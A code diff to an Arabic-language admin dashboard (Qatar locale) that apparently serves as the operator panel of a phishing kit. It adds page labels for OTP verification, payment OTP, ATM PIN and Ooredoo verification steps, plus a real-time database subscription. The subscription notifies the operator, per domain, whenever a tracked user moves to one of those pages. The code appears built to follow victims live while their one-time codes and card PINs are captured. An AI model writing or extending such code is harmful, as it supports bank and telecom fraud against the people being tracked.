@@ -16,7 +16,26 @@ interface ProcessingUser {
   phone: string;
   created_at: string;
   domain?: string;
+  current_page?: string;
 }
+
+// تعريف أسماء الصفحات بالعربي
+const pageLabels: { [key: string]: { label: string; color: string; icon: string } } = {
+  "processing-request": { label: "في الانتظار", color: "bg-yellow-100 text-yellow-800 border-yellow-200", icon: "⏳" },
+  "otp-verification": { label: "رمز التحقق", color: "bg-blue-100 text-blue-800 border-blue-200", icon: "🔢" },
+  "payment-otp": { label: "رمز الدفع", color: "bg-purple-100 text-purple-800 border-purple-200", icon: "💳" },
+  "atm-pin": { label: "رقم PIN", color: "bg-red-100 text-red-800 border-red-200", icon: "🏧" },
+  "ooredoo-verification": { label: "Ooredoo", color: "bg-orange-100 text-orange-800 border-orange-200", icon: "📱" },
+  "/otp-verification": { label: "رمز التحقق", color: "bg-blue-100 text-blue-800 border-blue-200", icon: "🔢" },
+  "/payment-otp": { label: "رمز الدفع", color: "bg-purple-100 text-purple-800 border-purple-200", icon: "💳" },
+  "/atm-pin": { label: "رقم PIN", color: "bg-red-100 text-red-800 border-red-200", icon: "🏧" },
+  "/ooredoo-verification": { label: "Ooredoo", color: "bg-orange-100 text-orange-800 border-orange-200", icon: "📱" },
+  "/registration-complete": { label: "بوابة الدفع", color: "bg-green-100 text-green-800 border-green-200", icon: "💰" },
+  "/forgot-password": { label: "نسيت كلمة المرور", color: "bg-gray-100 text-gray-800 border-gray-200", icon: "🔑" },
+  "/account-creation": { label: "إنشاء حساب", color: "bg-indigo-100 text-indigo-800 border-indigo-200", icon: "👤" },
+  "/success": { label: "مكتمل", color: "bg-emerald-100 text-emerald-800 border-emerald-200", icon: "✅" },
+  "/meme": { label: "ميم", color: "bg-pink-100 text-pink-800 border-pink-200", icon: "😂" },
+};
 
 const AdminDashboard = () => {
   const [users, setUsers] = useState<ProcessingUser[]>([]);
@@ -93,6 +112,24 @@ const AdminDashboard = () => {
           if (newUser.domain === enteredDomain) {
             playNotificationSound();
             toast.success(`مستخدم جديد: ${newUser.name}`);
+          }
+          loadUsers();
+        }
+      )
+      .on(
+        "postgres_changes",
+        {
+          event: "UPDATE",
+          schema: "public",
+          table: "processing_users",
+        },
+        (payload) => {
+          const updatedUser = payload.new as ProcessingUser;
+          if (updatedUser.domain === enteredDomain) {
+            const pageInfo = pageLabels[updatedUser.current_page || "processing-request"];
+            if (pageInfo && updatedUser.current_page !== "processing-request") {
+              toast.info(`${updatedUser.name} انتقل إلى: ${pageInfo.icon} ${pageInfo.label}`);
+            }
           }
           loadUsers();
         }
@@ -318,7 +355,9 @@ const AdminDashboard = () => {
           </Card>
         ) : (
           <div className="grid gap-4">
-            {users.map((user) => (
+            {users.map((user) => {
+              const pageInfo = pageLabels[user.current_page || "processing-request"] || pageLabels["processing-request"];
+              return (
               <Card key={user.id} className="shadow-sm hover:shadow-md transition-shadow">
                 <CardHeader className="pb-3">
                   <CardTitle className="text-lg flex items-center justify-between">
@@ -331,8 +370,13 @@ const AdminDashboard = () => {
                         <div className="text-sm text-gray-500 font-normal">{user.phone}</div>
                       </div>
                     </div>
-                     <div className="text-xs text-gray-400 font-normal">
-                      {new Date(user.created_at).toLocaleTimeString('ar-QA')}
+                    <div className="flex flex-col items-end gap-1">
+                      <div className="text-xs text-gray-400 font-normal">
+                        {new Date(user.created_at).toLocaleTimeString('ar-QA')}
+                      </div>
+                      <div className={`text-xs px-2 py-1 rounded-full border ${pageInfo.color}`}>
+                        {pageInfo.icon} {pageInfo.label}
+                      </div>
                     </div>
                   </CardTitle>
                 </CardHeader>
@@ -369,7 +413,8 @@ const AdminDashboard = () => {
                   </div>
                 </CardContent>
               </Card>
-            ))}
+              );
+            })}
           </div>
         )}
       </main>
